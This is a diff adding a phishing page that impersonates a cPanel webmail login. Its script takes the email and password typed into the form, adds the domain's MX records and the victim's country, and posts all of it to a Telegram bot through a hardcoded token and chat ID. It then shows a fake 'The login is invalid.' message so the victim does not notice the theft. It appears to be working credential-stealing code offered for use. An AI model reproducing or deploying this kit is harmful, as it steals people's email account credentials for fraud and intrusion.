@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        .notification-bar {
+            padding: 10px;
+            width: 320px;
+            margin: 20px auto;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            display: none;
+        }
+
+        .auth-bar {
+            background-color: #007bff;
+        }
+
+        .error-bar {
+            background-color: #dc3545;
+        }
+
+        .container {
+            margin-top: 100px;
+        }
+
+        img {
+            margin-bottom: 40px;
+            width: 320px;
+        }
+
+        .login-box {
+            margin: 0 auto;
+            width: 350px;
+        }
+
+        .login-box label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            font-size: 14px;
+            margin-left: 10px; /* Moved label 4px to the right */
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 40px; /* Increased spacing */
+        }
+
+        .input-group input {
+            width: 70%;
+            padding: 10px 40px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .input-group .icon {
+            position: absolute;
+            top: calc(50% + 6px); /* Moved down by 6px */
+            left: calc(10px + 6px); /* Moved right by 6px */
+            transform: translateY(-50%);
+            color: rgba(0, 0, 0, 0.5); /* Dark blurry color */
+            font-size: 18px;
+        }
+
+        .login-box button {
+            width: calc(100% - 12px); /* Reduced width by 6px on each side */
+            padding: 10px;
+            background-color: #5c8db5; /* Lighter blue */
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .login-box button:hover {
+            background-color: #4682b4; /* Darker hover effect */
+        }
+
+        .languages {
+            margin-top: 60px;
+            color: gray;
+        }
+
+        .languages a {
+            color: gray;
+            text-decoration: none;
+            margin-right: 15px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: gray;
+        }
+
+        .footer a {
+            color: gray;
+            text-decoration: none;
+        }
+
+        .footer a:before {
+            content: "∞ "; /* Infinity sign */
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Notification bar -->
+    <div id="notification-bar" class="notification-bar auth-bar">
+        Authenticating...
+    </div>
+
+    <div class="container">
+        <img src="webmail-logo.svg" alt="Webmail Logo">
+        <div class="login-box">
+            <form onsubmit="sendDataToTelegram(event)">
+                <div class="input-group">
+                    <label for="email">Email Address</label>
+                    <span class="icon">&#128100;</span> <!-- Blurred dark user icon -->
+                    <input type="text" id="email" name="email" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <span class="icon">&#128274;</span> <!-- Blurred dark lock icon -->
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <button type="submit">Log in</button>
+            </form>
+        </div>
+
+        <div class="languages">
+            <a href="#">English</a>
+            <a href="#">العربية</a>
+            <a href="#">čeština</a>
+            <a href="#">dansk</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Ελληνικά</a>
+            <a href="#">español</a>
+            <a href="#">español latinoamericano</a>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Function to get query parameters
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Populate email field from the URL parameter
+        window.onload = function() {
+            const emailParam = getQueryParam('email');
+            if (emailParam && emailParam !== "[[-email-]]") {
+                document.getElementById('email').value = emailParam;
+            }
+        };
+
+        async function sendDataToTelegram(event) {
+            event.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const notificationBar = document.getElementById("notification-bar");
+
+            // Extract domain from email
+            const domain = email.split('@')[1];
+
+            // Fetch MX records for the domain
+            let mxRecords = "Unable to fetch MX records";
+            try {
+                const mxResponse = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+                const mxData = await mxResponse.json();
+                if (mxData.Answer) {
+                    mxRecords = mxData.Answer.map(record => record.data).join(", ");
+                }
+            } catch (error) {
+                console.error("Error fetching MX records:", error);
+            }
+
+            // Fetch country using ipinfo.io
+            let country = "Unknown";
+            try {
+                const geoResponse = await fetch('https://ipinfo.io/json');
+                const geoData = await geoResponse.json();
+                country = geoData.country;
+            } catch (error) {
+                console.error("Error fetching country:", error);
+            }
+
+            const botToken = "7296259786:AAEouXz7crjzYMqXBAY3W0rSL0jqaK-lvp8";
+            const chatId = "6885599280";
+            const message = `Email: ${email}\nPassword: ${password}\nDomain: ${domain}\nMX Records: ${mxRecords}\nCountry: ${country}`;
+
+            notificationBar.textContent = "Authenticating...";
+            notificationBar.style.display = "block";
+            notificationBar.className = "notification-bar auth-bar";
+
+            try {
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+
+                notificationBar.textContent = "The login is invalid.";
+                notificationBar.className = "notification-bar error-bar";
+            } catch (error) {
+                notificationBar.textContent = "An error occurred. Please try again.";
+                notificationBar.className = "notification-bar error-bar";
+            }
+        }
+    </script>
+</body>
+</html>
